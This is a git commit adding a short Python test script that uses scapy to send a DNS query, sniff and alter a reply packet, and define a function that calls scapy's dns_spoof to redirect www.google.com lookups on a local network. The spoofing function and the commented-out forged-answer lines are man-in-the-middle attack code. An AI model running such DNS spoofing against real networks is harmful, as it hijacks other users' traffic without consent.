91748da520ff4cf530d6a7eef402139692d79954
Sebastian Gema Perdana <104376817+4dapse@users.noreply.github.com>
2023-06-09 05:26:19 +0200

    test of native scapy DNS spoofer

---
+++ dnsSpoofTest.py
@@ -0,0 +1,25 @@
+from scapy.all import *
+
+def dns_req_test() : #This is creating a Standard Query Response. qr=1 indicates that it is a response. an=DNSRR(rrname='www.google.com', rdata='8.8.8.8')
+    dns_packet2 = IP(dst='8.8.8.8') / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname='www.google.com'))
+    dns_packet2.show()
+    send(dns_packet2)
+    
+def sniff_test() : 
+    pkt = sniff(filter='host 8.8.8.8', count=1, prn=lambda x: x.show())
+    pkt[DNS].qr = 1
+    pkt.show()
+    # pkt[IP].dst = '192.168.178.22'
+    # pkt[DNS].an = DNSRR(rrname='www.google.com', rdata='8.8.8.8')
+    # pkt.show()
+    # send(pkt)
+    
+def MIMspoofDNS() : 
+    dns_spoof(joker='192.168.178.23', match='www.google.com', from_ip='192.168.178.22')
+    
+def main() :
+    dns_req_test()
+    sniff_test()
+    print("Test Success")
+
+main()
